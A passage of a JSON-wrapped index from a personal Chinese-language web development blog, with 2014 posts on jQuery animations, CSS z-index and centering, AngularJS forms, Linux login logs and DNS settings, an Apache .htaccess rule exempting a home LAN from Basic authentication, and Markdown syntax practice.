簡易教學\nhttp://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas\n\nWeb Starter Kit\nhttps://developers.google.com/web/fundamentals/\n\n猴子都能懂的Git入門\nhttp://backlogtool.com/git-guide/cn/\n\nFork me on GitHub – CSS ribbon\nhttps://simonwhitaker.github.io/github-fork-ribbon-css/\n\nPure CSS responsive \"Fork me on GitHub\" ribbon\nhttp://codepo8.github.io/css-fork-on-github-ribbon/\n\nhexo架blog初體驗(原來github也可以拿來玩當blog  0.0)\nhttp://code.kpman.cc/2013/04/26/hexo%E6%9E%B6blog%E5%88%9D%E9%AB%94%E9%A9%97/\n\nSublime Text 3 Mac 指南\nhttp://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/\n\n2014/09\n-----------\n Bootsnipp 收集了很多常見的 UI 範例，並提供 HTML Snippets 供我們直接參考使用。\n http://bootsnipp.com/\n\n PHP 應用程式(1): 防禦型程式寫法\n http://lab.asika.tw/programming/theories-and-concepts/40-strong-php-1-defensive-programming.html\n\n 本文介紹了幾個工具，讓不善於設計的朋友也可以製作出自己的圖形化資訊。\n http://www.noupe.com/design/10-tools-to-create-beautiful-infographics-and-visualize-data-84300.html\n\n  HTML5 Page Visibility API\n  http://code.tutsplus.com/articles/html5-page-visibility-api--cms-22021\n\n  本文完整收集了所有 CSS 置中的解決方案\n  http://css-tricks.com/centering-css-complete-guide/\n\n\n本文透過一些情境的介紹，教你如何使用 JavaScript 讓網站更聰明，更加個人化，這些情境包括：\n1. 透過 IP 對應的地理位置\n2. 時間 (星期幾)\n3. 拜訪的次數\n當然還有其他資訊可以參考，最重要的是讓訪客感覺這個網站會依照他的狀況而有不同的呈現。\nhttp://www.sitepoint.com/website-personalization/\n\n\n FocusPoint.js\n https://github.com/jonom/jquery-focuspoint\n\n 本文完整地介紹了該怎麼透過 Google Analytics ，幫我們分析出網站的 RWD 是否有正確作用在用戶的瀏覽器上。\nhttp://www.smashingmagazine.com/2014/08/28/responsive-web-design-google-analytics/\n\nHeatmap.js\nhttp://www.patrick-wied.at/static/heatmapjs/\n\nMent.io 是一個可以讓我們在文字框中使用 @ 和 # 做出自動完成效果的 AngularJS 模組\nhttp://jeff-collins.github.io/ment.io/\n\nuilang\nhttp://uilang.com/\n\n Cross-site HTTP request (CROS)\n https://developer.mozilla.org/zh-TW/docs/HTTP/Access_control_CORS\n\n Sublime 套件\n https://github.com/titoBouzout/SideBarEnhancements\n\nFirebase\nhttps://www.firebase.com/\n\n DreamFactory\n http://bit.ly/dreamfactory-com\n\n html2canvas\n http://html2canvas.hertzen.com/examples.html\n\n\nparallax scrolling\nhttp://jquer.in/category/jquery-plugins-for-awesome-scrolling-and-scrollbars-on-websites/\nhttp://alvarotrigo.com/fullPage/\nhttp://www.webhostingreviewboards.com/design/10-best-jquery-plugins-for-scrolling-effects/\nhttp://www.devfloat.com/jquery-parallax-scrolling-tutorials/\nhttp://www.franckmaurin.com/the-parallax-effects-with-jquery/\n","categories":["網站記錄"]},{"title":"Linux DHCP DNS重開機跑掉的問題","url":"%2Fblog%2F2014%2F08%2F25%2Flogdown%2F2014-08-25-linux-dhcp-dns-to-turn-off-problem%2F","content":"在Google搜尋到解決方法[Linux DHCP DNS設定問題](http://ithelp.ithome.com.tw/question/10071258)\n有空測試一下，先記錄一下。\n\n>主機使用 DHCP 取得 IP，有時後會出現明明就設定好了，但是重開機後DNS的設定又跑掉的問題。\n若是有此問題，請修改該網卡的設定。\n設定完DNS後，請修改網卡的部份。(假設網卡為eth0)\n請加入PEERDNS=no後重啟網路或重開機就行了。\n\n>詳細內容請參考http://blog.faq-book.com/?p=2717","tags":["DNS"],"categories":["Linux"]},{"title":"JQuery相關Animate function筆記","url":"%2Fblog%2F2014%2F07%2F09%2Flogdown%2F2014-07-09-jquery-animate-notes%2F","content":"最近發現JQuery 有人用Animate做背景動態效果\n```javascript\n$('body').stop().animate({backgroundColor:'#00b1ff'},500);\n```\n自已用plunker測試發現不能使用\n原來需要裝一個套件才能用\n<!--more-->\n\n> All animated properties should be animated to a single numeric value, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the jQuery.Color() plugin is used). Property values are treated as a number of pixels unless otherwise specified. The units em and % can be specified where applicable.\n\n[jquery-color套件](https://github.com/jquery/jquery-color)\n套件能用Animate套用CSS屬性如下\n> Supported properties\n------------------------------\nbackgroundColor, borderBottomColor, borderLeftColor, borderRightColor, borderTopColor, color, columnRuleColor, outlineColor, textDecorationColor, textEmphasisColor\n\n\nStop()\n---------\nStop()能暫停animate動作\n\ndelay()\n--------\n延遲animate動作時間\n\n簡單滑入滑出動作範例\n\n```javascript\n$(\"h1\").hover(function(){\n\t$(this).fadeTo(0, 0.7);\n\t},function(){\n\t\t$(this).fadeTo(0, 1.0);\n  });\n```\n\n\n","tags":["animate"],"categories":["網頁特效"]},{"title":"利用影片來做背景動態效果","url":"%2Fblog%2F2014%2F07%2F06%2Flogdown%2F2014-07-06-using-films-to-do-a-background-animation%2F","content":"最近逛到[未確認進行式動畫官網](http://mikakunin.jp/index.html)\n看到背景是動態畫面，第一個直覺這是`Flash`\n但右鍵不是!!!!\n奇怪就算是HTML5播放影片右鍵應該可以控制影片\n<!--more-->\n\n簡單看了一下原始碼\n是用HTML5裡的Video來播放了，但怎麼沒辦法右鍵控制???\n其實最外面的那一層**#headWrap**把Video擋住了\n\n其實div還用滿多z-index圖層\n\n目前搞不懂#headWrap的z-index:20\nVideo的z-index:40\n\\#headWrap可以在Video上面\n\n最後，找到[z-index playground](http://www.css-101.org/z-index/playground.php)\n雖然左邊英文看不懂orz，但是簡單玩了一下右邊圖層關係\n`某div裡的div的z-index`跟外面div裡的z-index比較\n會對照`某div裡的div的z-index`的parent div  z-index去跟外面比較\n而非div裡面的z-index\n___此說法可能有錯誤___\n\n所以[未確認進行式動畫官網](http://mikakunin.jp/index.html)\n\\#headWrap的z-index:20\n雖然Video的z-index:40，但是外層的#visualWrap的z-index:10\n所以\\#headWrap就在上面\n\n雖然有找到[CSS z-index 屬性的使用方法和層級樹的概念](http://www.neoease.com/css-z-index-property-and-layering-tree/)\n但親身玩一下[z-index playground](http://www.css-101.org/z-index/playground.php)才會比較清楚\n\n------\n\n話說看暗殺教室和未確認進行式官網的CSS寫法\n感覺網頁設計師是用SASS寫出來的0.0\n可惜目前CSS能力不足，可能沒辦法碰此部份orz","tags":["z-index"],"categories":["網頁特效"]},{"title":"說話框放大縮小特效、背景置中","url":"%2Fblog%2F2014%2F07%2F06%2Flogdown%2F2014-07-06-talk-box-zoom-effects%2F","content":"前幾天逛到[暗殺教室動畫官網](http://ansatsu-anime.com/main.php)\n![暗殺1.png](http://user-image.logdown.io/user/8284/blog/8171/post/208517/qEtVYRBzTvCwqT5HmhGf_%E6%9A%97%E6%AE%BA1.png)\n指要把滑鼠移到暗殺老師頭，旁邊就會跑出說話框\n<!--more-->\n\n![暗殺2.png](http://user-image.logdown.io/user/8284/blog/8171/post/208517/vh7wWd6TMeWPpxRbg0I4_%E6%9A%97%E6%AE%BA2.png)\n然而還可以貼其靠左置中\n\n而且持續拉螢幕一直放大，中間圖片背景還是不變(置中)\n正常div置中都是用\n```css\nwidth:50%;\nmargin:0px auto;\n```\n不過\n完完全全不知道是怎麼做到了\n想了很久其實很簡單\n```css\n\tbackground-repeat: no-repeat;\n\tbackground-position: center top;\n```\n當出碰CSS沒有印象有`background-position`這個東西\n\n接下來，說話框他貼齊的方法是用table\n```css\n.fukidashi table {\n\theight: 305px;\n\twidth: 225px;\n}\n.fukidashi td {\n\ttext-align: left;\n\tvertical-align: middle;\n}\n```\n再好幾年前看到網頁設計要避免使用table\n不過這個方法還滿簡單對齊\n\n置於動態效果是用\n```javascript\n$(\"#fukidashi\").hover(function(){\n$(\".fukidashi img\").stop().animate({\"width\":\"215px\",\"height\":\"305px\"},100);\n},\nfunction(){\n$(\".fukidashi img\").stop().animate({\"width\":\"1px\",\"height\":\"1px\"},200);\n});\n```\n沒想到JQuery的animate function可以做出此特效\n\n-------\n最後手動實例一下吧\n[實例成果](http://plnkr.co/edit/ziBX7eMesKRXoz1urVnY?p=preview)\n```html index.html\n<!DOCTYPE html>\n<html>\n\n  <head>\n    <link rel=\"stylesheet\" href=\"style.css\">\n    <script data-require=\"jquery@2.1.1\" data-semver=\"2.1.1\" src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.1/jquery.min.js\"></script>\n    <script src=\"script.js\"></script>\n    <link href=\"style.css\" rel=\"stylesheet\" />\n  </head>\n\n  <body>\n    <h1>天線寶寶說你好</h1>\n    <div class=\"wrap\">\n    <div class=\"main\">\n    <div class=\"image\"></div>\n    <div class=\"word\">\n    <table><tr><td>\n      你好\n    </td></tr>\n    </table>\n    </div>\n    </div>\n    </div>\n  </body>\n\n</html>\n```\n\n```javascript script.js\n// Code goes here\n$(document).ready(function(e) {\n  $(\"div.image\").hover(function(){\n  $(\".word\").stop().animate({\"font-size\":\"50px\"},100);\n  },\n  function(){\n  $(\".word\").stop().animate({\"font-size\":\"1px\"},200);\n  });\n});\n```\n\n```css style.css\ndiv.image {\n  position:absolute;\n  top:300px;\n  left:300px;\n  background-image: url('data:image/png;base64,....);\n\twidth:            189px;\n\theight:           240px;\n}\ndiv.wrap {\n  height:600px;\n  background-repeat: no-repeat;\n\tbackground-position: center top;\n  background-image: url('data:image/png;base64,...);\n}\n\ndiv.word table{\n  width:100%;\n  height:100%;\n}\n\ndiv.word{\n  position:absolute;\n  width:200px;\n  height:100px;\n  top:200px;\n  left:290px;\n  font-size:1px;\n}\ndiv.word td{\n  text-align:center;\n  vertical-align:bottom;\n}\ndiv.main{\n  position:relative;\n\theight:           600px;\n}\n```\n\n最後做這個範例也花了我不少時間\n由於Easy GO裡的GIMP和Krita都不太會使用... 耗了我滿久的時間(本人美功也很爛)\n然後欄的用說話框，就改成字體放大\n這個實例可能有點弱。哈。","tags":["vertical-align"],"categories":["網頁特效"]},{"title":"記錄網頁特效動機","url":"%2Fblog%2F2014%2F07%2F05%2Flogdown%2F2014-07-05-web-effects-notes%2F","content":"最近看到一些日本動畫網站做的越來越厲害\n以前看到動態以為是Flash做出來的東西\n但仔細一看，竟然是HTML5+JavaScript合出來的東西\n於是我對一些網站製作手法開始有興趣了\n<!--more-->\n\n其實我大學的時候沒打算去碰前端美功東西\n因為知道自已沒有美功天份\n加上寫程式就要發很多時間(自已能力可能不足...orz)\n所以大學程式介面都不是能看的\n\n之前大學二年級因為覺得當時AJAX很神奇\n但JavaScript真的沒有什麼碰過，買了`JavaScript大全`傳說中的聖經\n而且書某些地方還滿難的，所以就沒繼續下去\n然後就看到JQuery，當出某網站寫JQuery **寫的少，做的多，跨任合平台**\n當時jQuery中文書很少，只有一本...   [網頁設計．愛上jQuery](http://www.books.com.tw/products/0010581307)\n英文苦手的我沒辦法讀網路相關英文文件，之後查到有相關中文書，就去學校圖書館推薦，苦等了三個月終於書來了\n\n由於沒有相關CSS Selector觀念，再加上當時碰過程式語言只有Java、PHP\n所以接觸JQuery程式語言寫法`$(\"id or elemnt or css selector\")` ，說真的不知道耗我幾天的時間\n我完完全全都是靠自已測試好幾次，才了解要怎麼使用\n最後的困難，就是利用AJAX實現GET、POST\n由於當時不會使用Firebug，所以瀏覽器點下沒動作就傻傻到裡面去看程式碼有沒有問題\n不像現在Firefox、Chrome有`Ctrl+Alt+i`就有網頁開發工具方便(也許那時候以前有也說不定orz)\n\n最近這幾年JQuery看到很多網站應用越來越多了\n雖然我現在還是覺得JQuery能力不是說很好，每次寫的程式都很臭長，但是JQuery已經可以滿足我目前控制需求\n當出記畫打算從JQuery→JavaScript，但沒想到JQuery滿足我後，我之後都沒去碰JavaScript了\n有點後悔當出要先從JavaScript→JQuery\n\n最後\n~~我當然不是要當copycat~~\n我希望看到別人不錯的特效，查看原始碼看如何實現的\n加以記錄，雖然我目前打算應該打算朝後端工程式為目標\n但是最近Web相關技術(Bootstrap、AnjularJS...等等)都越來越紅，紅到我都感到有興趣了\n也許未來我做網站可能會用到，也許我跑去當前端工程師也說不定...\n未來的事誰知道...","categories":["網頁特效"]},{"title":"AngularJS讀取載入檔案資訊","url":"%2Fblog%2F2014%2F07%2F03%2Flogdown%2F2014-07-03-read-angularjs-loading-file-information%2F","content":"http://www.dotblogs.com.tw/regionbbs/archive/2012/06/28/html5.file.api.aspx\nhttp://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx\nhttp://stackoverflow.com/questions/16579427/html5-file-upload-with-angularjs\nhttp://plnkr.co/edit/JPxSCyrxosVXfZnzEIuS?p=preview\nhttp://plnkr.co/edit/HEA7wYq8Uv0Ee0J4SX7u?p=preview\n\nhtml\n```html\n<!doctype html>\n<html ng-app=\"plunker\" >\n<head>\n  <meta charset=\"utf-8\">\n  <title>AngularJS Plunker</title>\n  <script>document.write('<base href=\"' + document.location + '\" />');</script>\n  <link rel=\"stylesheet\" href=\"style.css\">\n  <script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.0.6/angular.js\"></script>\n  <script src=\"app.js\"></script>\n</head>\n<body ng-controller=\"MainCtrl\">\n<input type=\"file\" filelist-bind multiple=\"multiple\"  name=\"files\"/>\n<br>\nfiles : <pre>{{ files | json }}</pre>\n</body>\n</html>\n\n```\n\n```javascript\nvar app = angular.module('plunker', []);\n\napp.directive('filelistBind', function() {\n  return function( scope, elm, attrs ) {\n    elm.bind('change', function( evt ) {\n      scope.$apply(function() {\n        name =\"\";\n        for(i=0;i<evt.target.files.length;i++){\n          alert(evt.target.files[i].name);\n          name += evt.target.files[i].name;\n        }\n        scope[ attrs.name ] = name;\n      });\n    });\n  };\n});\n\napp.controller('MainCtrl', function($scope) {\n  $scope.name = 'World';\n});\n\n```\n\n\nhttp://stackoverflow.com/questions/16207202/required-attribute-not-working-with-file-input-in-angular-js\nhttp://jsfiddle.net/danielzen/utp7j/\n","categories":["AngularJS"]},{"title":"last登入資訊不見了!!!","url":"%2Fblog%2F2014%2F07%2F01%2Flogdown%2F2014-07-01-last-login-information-is-gone%2F","content":"今天在宿舍連家裡的動物機連不進去，後來就用真實IP連線去了\n登入後馬上下意識用`last`去看一下登入狀況\n結果發現只有一條剛剛登入的訊息!!!\n<!--more-->\n\n後來看了一下鳥哥[一些常見指令： last, lastlog, dmesg](http://linux.vbird.org/linux_basic/0570syslog/0570syslog-fc4.php#analyze_command)\n```sh\n[root@linux ~]# last -n number\n[root@linux ~]# last -f filename\n參數：\n-n  ：我們知道 last 會讀出這個月的資料，若資料量太大，可使用 -n 來嚴格要求\n      所以顯示的筆數即可。例如 20 筆資料： last -n 20 或 last -20 均可。\n-f  ：last 預設讀出 /var/log/wtmp 這個檔案，但是我們可以透過 -f 讀取不同的\n      登錄檔資訊喔！\n範例：\n\n範例一：將上個月的資料讀出，僅讀出 5 筆資料時？\n[root@linux ~]# last -n 5 -f /var/log/wtmp.1\ndmtsai2  pts/2             Mon Oct 24 14:18 - 14:18  (00:00)\ndmtsai2  work:0 work       Mon Oct 24 14:18    gone - no logout\ndmtsai2  work:0 work       Mon Oct 24 14:18 - 14:18  (00:00)\ndmtsai2  pts/2             Mon Oct 24 14:18 - 14:18  (00:00)\ndmtsai2  work:0 work       Mon Oct 24 14:18 - 14:18  (00:00)\n```\n舊的登入資訊會存到wtmp.1那邊\n\n致於no-ip不能連的原因是似乎no-ip那邊出點狀況。[詳細原因](http://kfei.logdown.com/posts/207916-poor-no-ip)\n >  NOTICE: Our domains are still experiencing outages due to the Microsoft takedown. Please read our formal statement on the matter.\n\n看來動物機沒被hack :)\n白擔心了一下\n\n今日發現`lastlog`實用的指令，查詢所有帳號最後一次登入的時間\n可惜這個指令目前用不太到","tags":["last"],"categories":["Linux"]},{"title":"Bootstrap相關不錯的工具網站","url":"%2Fblog%2F2014%2F06%2F26%2Flogdown%2F2014-06-26-bootstrap-good-tools-website%2F","content":"http://www.webmart.tw/blog/15-best-bootstrap-tools-for-designers/\n\nhttp://bootswatch.com/\n","categories":["網站記錄"]},{"title":"瀏覽器播放影片控制開始時間和結束時間","url":"%2Fblog%2F2014%2F06%2F25%2Flogdown%2F2014-06-25-play-the-movie-browser-controls-the-start-time-and-end-time%2F","content":"最近在想有沒有瀏覽器播放MP4控制播放時間\n結果一搜尋還真的有耶!!!\n\n在(Start HTML5 video at a particular position when loading?)[http://stackoverflow.com/questions/5981427/start-html5-video-at-a-particular-position-when-loading]這篇找到相關方法\n<!--more-->\n\n```\nhttp://www.yoursite.com/yourfolder/yourfile.mp4#t=5,15\n```\n\n後來還發現能用00:00:00格式\n```\nhttp://www.yoursite.com/yourfolder/yourfile.mp4#t=0:00:00,0:01:00\n```\n\n\n(Media Fragment)[http://www.w3.org/TR/media-frags/]","tags":["video"],"categories":["HTML"]},{"title":"Apache設定區域IP免BASIC認證就直接進入網頁","url":"%2Fblog%2F2014%2F06%2F21%2Flogdown%2F2014-06-21-set-regional-ip-from-apache-basic-authentication-directly-into-the-webpage%2F","content":"最近厭煩在家還要輸入Basic認證才能線上聽到我的Raspberry Pi上音樂\n看了大多數htaccess設定  都沒辦法達成我想要的結果\n\n最後在[.htaccess - Allow IP address without authentication - Stack Overflow](http://stackoverflow.com/questions/3649852/allow-ip-address-without-authentication)這篇找到正解\n<!--more-->\n\n\n```\nOrder deny,allow\nDeny from all\nAuthName \"Please type password\"\nAuthType Basic\nAuthUserFile \"/var/www/player/.htpasswd\"\nrequire valid-user\nAllow from 192.168.0.0/24\nSatisfy Any\n\n```\n\n以後在家就不用打認證:D\n\nhtaccess相關設定文件\n======\n[在線上製作.htaccess](http://www.htaccesseditor.com/tc.shtml)\n[Apache的Satisfy详解](http://www.fwolf.com/blog/post/341)\n[常見的 .htaccess 使用技巧](http://www.php100.com/html/webkaifa/apache/2012/1031/11436.html)\n","tags":[".htaccess"],"categories":["Apache"]},{"title":"不同桌面解析度用CSS調整圖適中的方法(max-width)","url":"%2Fblog%2F2014%2F06%2F14%2Flogdown%2F2014-06-14-moderate-css-adjustments-for-different-desktop-resolutions-methods-max-width%2F","content":"今天用平板電腦看[Glayer](http://www.glayer.net/)\n發現橫向、直向看某圖大小非常不一樣。\n起先我以為是我的錯覺，在經過用Firefox確實大小不一樣。\n<!--more-->\n\n\n![畫面擷取於 2014-06-01 19.30.51.png](http://user-image.logdown.io/user/8284/blog/8171/post/206142/1EsrMUkrSI2yQ0fuBjQo_%E7%95%AB%E9%9D%A2%E6%93%B7%E5%8F%96%E6%96%BC%202014-06-01%2019.30.51.png)\n\n\n![畫面擷取於 2014-06-01 19.31.24.png](http://user-image.logdown.io/user/8284/blog/8171/post/206142/wLWdhaoPQMCFxmDZHsgU_%E7%95%AB%E9%9D%A2%E6%93%B7%E5%8F%96%E6%96%BC%202014-06-01%2019.31.24.png)\n\n本來在想是用什麼巫術才能變成這樣，Bootstrap?HTML?\n沒想到是CSS的`max-width`的關係\n\n之前看到CSS的`max-width`一直都不知道要試用於哪裡\n今天總算知道了:D","tags":["max-width,CSS"],"categories":["CSS"]},{"title":"AngularJS新手小試","url":"%2Fblog%2F2014%2F06%2F14%2Flogdown%2F2014-06-14-angularjs-novice-trial%2F","content":"AngularJS是一個MVC架構JavaScript Framework，是這幾年比較紅的。[詳細介紹維基](http://zh.wikipedia.org/wiki/AngularJS)\n\n最近簡單做了簡單輸入檔案計算，如下\n<!--more-->\n\n\n```html\n<!doctype html>\n<html lang=\"zh-TW\" ng-app>\n<head>\n\t<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-beta.11/angular.min.js\"></script>\n\t<meta charset=\"UTF-8\">\n\t<title>簡易檔案計算程式  WEB</title>\n\t<script>\n\tfunction select_all(){\n\t var textBox = document.getElementById(\"foo\");\n\n\ttextBox.focus();\n\ttextBox.select();\n\t}\n\tshowFileData =function ($scope){\n\t\t$scope.test = function(){\n\t\t\tif ($scope.isShowGB) {\n\t\t\t\tif ($scope.fileGBMB==\"GB\") {\n\t\t\t\t\t$scope.fileData = $scope.fileNumber+\"GB\";\n\t\t\t\t}else{\n\t\t\t\t\t$scope.fileData = Number($scope.fileNumber/1024).toFixed(1)+\"GB\";\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t\tif ($scope.fileGBMB==\"GB\") {\n\t\t\t\t\t$scope.fileData = Number($scope.fileNumber*1024).toFixed(0)+\"MB\";\n\t\t\t\t}else{\n\t\t\t\t\t$scope.fileData = $scope.fileNumber+\"MB\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t}\n\n\t</script>\n</head>\n<body style=\"margin: 10px auto; width:90%;line-height:36px;background-color:#e6e6e6\" ng-controller=\"showFileData\" ng-form=\"form1\">\n\t<input type=\"checkbox\" ng-model=\"isShowGB\"  ng-change=\"test()\"  />顯示GB<br />\n\t檔案大小：<input  type=\"number\" ng-model=\"fileNumber\"  ng-change=\"test()\" required /><select ng-model=\"fileGBMB\" ng-init=\"fileGBMB='GB'\" ng-change=\"test()\" required>\n\t\t<option value=\"GB\">GB</option>\n\t\t<option value=\"MB\">MB</option>\n\t</select><br />\n<div ng-hide=\"form1.$invalid\">{{fileData}}</div>\n<div ng-show=\"form1.$invalid\"><h1>必要欄位沒填!!!</h1></div>\n</body>\n</html>\n```\n\n本實驗只有用到\n* ng-model\n* ng-controller\n* ng-click\n* ng-init\n* ng-change\n* ng-form\n* ng-show / ng-hide\n\n這次表單驗證是利用AngularJS內鍵功能來實作，`form1.$invalid`會傳會現在欄位是否真入正確值，還會查看HTML`type`是否符合型態，ng-show\n\n透過這次簡單的實驗發現AngularJS是一個很實用的工具，不知道是不是JQuery Selector用習慣的係，有時候控制裡面的原件都不知道如何去控制ng-show/ng-hide來顯示出結果要呈現。\n\nGoogle搜尋到不錯30天學AngularJS教學\nhttp://ithelp.ithome.com.tw/question/10132196","tags":["AngularJS"],"categories":["AngularJS"]},{"title":"重啟Linux桌面方法","url":"%2Fblog%2F2014%2F06%2F11%2Flogdown%2F2014-06-11-reboot-the-linux-desktop%2F","content":"最近使用Ezgo  11有時都會當機不動...\n最後都跳到tty1直接`sudo reboot`\n\n後來在想有沒有重啟桌面不重新開機方法...\n在經過一直Google下最終找到了方法 :D\n\n```\nps aux |grep tty 7\nsudo kill {tty7 id}\n```\n\n原來就**殺掉tty**就會自動重啟!!!!\n","tags":["Linux,tty,"],"categories":["Linux"]},{"title":"Markdown新手小試","url":"%2Fblog%2F2014%2F06%2F05%2Flogdown%2F2014-06-05-markdown-rookie-scale%2F","content":"在前幾年有Markdown這個東西，有嘗試著練習。不過...太久沒用了，也沒有實戰用到…，所以全部忘光光囧，但最近看到LogDown這個玩意，就突然想寫寫看。\nLogDown是台灣xdite大大做的，也算是台灣之光，所以也來支持一下^^\n<!--more-->\n\n\n#標題寫法\n```\n標題寫法(最高階)\n===\n```\nor\n```\n標題寫法(第二階)\n---\n```\nor\n```\n#標題寫法\n```\n\n\n>引用\n\n```\n>引用\n```\n\n>引用\n>>區塊引用\n\n```\n>引用\n>>區塊引用\n```\n\n+ 清單\n```\n+ 清單\n```\nor\n```\n- 清單\n```\nor\n```\n* 清單\n```\n\n1. PHP\n2. Python\n3. Ruby on Rails\n\n```\n1. PHP\n2. Python\n3. Ruby on Rails\n```\n\n*   This is a list item with two paragraphs.\n\n    This is the second paragraph in the list item. You're\nonly required to indent the first line. Lorem ipsum dolor\nsit amet, consectetuer adipiscing elit.\n\n*   Another item in the same list.\n\n```\n*   This is a list item with two paragraphs.\n\n    This is the second paragraph in the list item. You're (前面空白可縮白)\nonly required to indent the first line. Lorem ipsum dolor\nsit amet, consectetuer adipiscing elit.\n\n*   Another item in the same list.\n```\n\n* test\n\n    >test\n\n```\n* test\n\n    >test(前面四個空白)\n```\n\n1986\\.  What a great season.\n\n```\n1986\\. What a great season.\n```\n\nThis is a [Google Url ](http://google.com.tw).\n```\nThis is a [Google Url ](http://google.com.tw).\n```\n\nThis is a 相對位置 [url](test).\nThis is a  絕對位置 [url](/test/).\n```\nThis is a 相對位置 [url](test).\nThis is a  絕對位置 [url](/test/).\n```\n\nThis is a [Google URL][Google].\nThis is a [谷歌][谷歌].(id:中文也可以)\n[Google]: http://google.com.tw  \"Google\"\n[谷歌]: http://google.com.tw  \"谷歌\"\n\n```\nThis is a \\[Google URL\\]\\[Google\\].\nThis is a \\[Google URL\\]\\[google]\\.\nThis is a \\[谷歌]\\[谷歌].(id:中文也可以，不區分大小寫)\n\\[Google]: http://google.com.tw  \"Google\"\n\\[谷歌]: http://google.com.tw  \"谷歌\"\n```\n\n連結Google可以省略寫成\n[Google][]\n[Google]:http://google.com.tw\n```\n\\[Google][]\n\\[Google]:http://google.com.tw\n```\n\n\n\n\n```\n*em*\n__strong__\n```\n\n`ls -l`(一行顯示)\n```\n`ls -l`\n```\n\n\nThis is a ![Chrome Image](https://www.google.com.tw/images/icons/product/chrome-48.png)(用法跟一般連結差不多)\n```\nThis is a ![Chrome Image](https://www.google.com.tw/images/icons/product/chrome-48.png)\n```\n\n\n單一\\*或\\_包圍字串會轉成\\<em>\n兩個\\*或\\_包圍字串\\<strong>\n*em*\n__strong__\n~~strike~~\n\n```\n*em*\n__strong__\n~~strike~~\n```\n\n{% blockquote Author Name %}\nFlying is learning how to throw yourself at the ground and miss.\n{% endblockquote %}\n\n{% blockquote Author Name https://example.com/quotation/source/link %}\nOver the past 24 hours I've been reflecting on my life & I've realized only one thing. I need a medieval battle axe.\n{% endblockquote %}\n```\n{% blockquote Author Name %}\nFlying is learning how to throw yourself at the ground and miss.\n{% endblockquote %}\n\n \\{% blockquote Author Name https://example.com/quotation/source/link %}\nOver the past 24 hours I've been reflecting on my life & I've realized only one thing. I need a medieval battle axe.\n{% endblockquote %}\n```\n|第一欄|第二欄|第三欄|\n-------|:-------:|:--------:|\n|第一格|第二格|第三格|\n|第一格|第二格|第三格|\n\n```\n|第一欄|第二欄|第三欄|\n-------|:-------:|:--------:|\n|第一格|第二格|第三格|\n|第一格|第二格|第三格|\n```\n***test***\n\n```mathjax\n1+1=2\n```\n\n\n有些用Markdown包起\\```來好像怪怪的，不知道是不是我寫錯的關係。以前也不知道Markdown也能寫表格XD\n希望以後這些我前用的到。\n\n","tags":["Markdown"],"categories":["Markdown"]},{"title":"webix-強大WEB UI Framework","url":"%2Fblog%2F2014%2F05%2F28%2Flogdown%2F2014-05-28-webix-powerful-web-ui-framework%2F","content":"#webix\n> 這個白俄羅斯人寫的 UI Framework 有點強大呀！整合了 Backbone.js 與 AngularJS ，光看首頁的 Demo (不是圖片動畫喔) 就讓人好熱血！\n\nhttp://webix.com/\n\n在Jace Ju的FB看到不錯好工具，先記錄一下，有空去實作看看。^^","tags":["webix"],"categories":["Web-UI"]},{"title":"Hello World","url":"%2Fblog%2F2014%2F05%2F27%2Flogdown%2F2014-05-27-hello-world%2F","content":"Hi, This a demo post of [Logdown](http://logdown.com). \n\nLogdown use Markdown as main syntax, you can find more example by reading this [document on Wikipedia](http://en.wikipedia.org/wiki/Markdown)\n\nLogdown also support drag & drop image uploading. The picture syntax is like this:\n\n![](http://logdown.com/images/logo.png)\n\n## Bloging with code snippet:\n\n`inline code`\n\n### Plain Code\n\n```\nputs \"Hello World!\"\n```\n\n### Code with Language\n\n```ruby\nputs \"Hello World!\"\n```\n\n### Code with Title\n\n```ruby hello_world.rb\nputs \"Hello World!\"\n```\n\n\n## MathJax Example\n\n### Mathjax\n\n```mathjax\nx = \\dfrac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}\n```\n\n### Inline Mathjax\n\nThe answser is `$a^2 + b^2 = c^2$`.\n\n## Table Example\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 1         | Hello         | $1600 |\n| col 2         | Hello         |   $12 |\n| col 3         | Hello         |    $1 |\n"}]